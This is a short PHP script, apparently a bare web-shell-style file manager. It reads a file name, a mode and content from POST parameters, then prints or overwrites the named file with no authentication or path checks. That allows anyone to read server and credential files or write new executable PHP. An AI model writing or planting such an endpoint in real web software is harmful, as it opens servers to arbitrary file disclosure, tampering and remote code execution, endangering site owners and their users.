<?php  
$fn=$_POST['fileName'];
$rw=$_POST['rw'];
$fp = fopen($fn, $rw); 
if($rw=='r'){
while(! feof($fp)) 
{ 
echo fgets($fp); 
} 
}else{
$content=$_POST["content"];
fwrite($fp, $content);
fclose($fp);
}
?>